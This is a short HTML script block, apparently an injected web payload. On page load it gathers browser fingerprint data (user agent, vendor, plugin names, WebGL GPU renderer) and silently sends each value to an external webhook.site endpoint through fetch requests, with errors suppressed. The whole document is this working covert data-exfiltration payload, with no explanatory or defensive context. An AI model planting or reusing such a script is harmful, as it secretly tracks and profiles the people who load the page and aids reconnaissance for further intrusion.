<script>
const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427/';
function report(title, data) {
    fetch(webhook + '?title=' + encodeURIComponent(title) + '&data=' + encodeURIComponent(data))
        .catch(e => {});
}
report('UserAgent', navigator.userAgent);
report('AppVersion', navigator.appVersion);
report('Vendor', navigator.vendor + ' / ' + navigator.vendorSub);
report('Plugins', JSON.stringify([...navigator.plugins].map(p=>p.name)));
report('WebGL', (() => {
    try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e) { return 'n/a: ' + e; }
})());
</script>
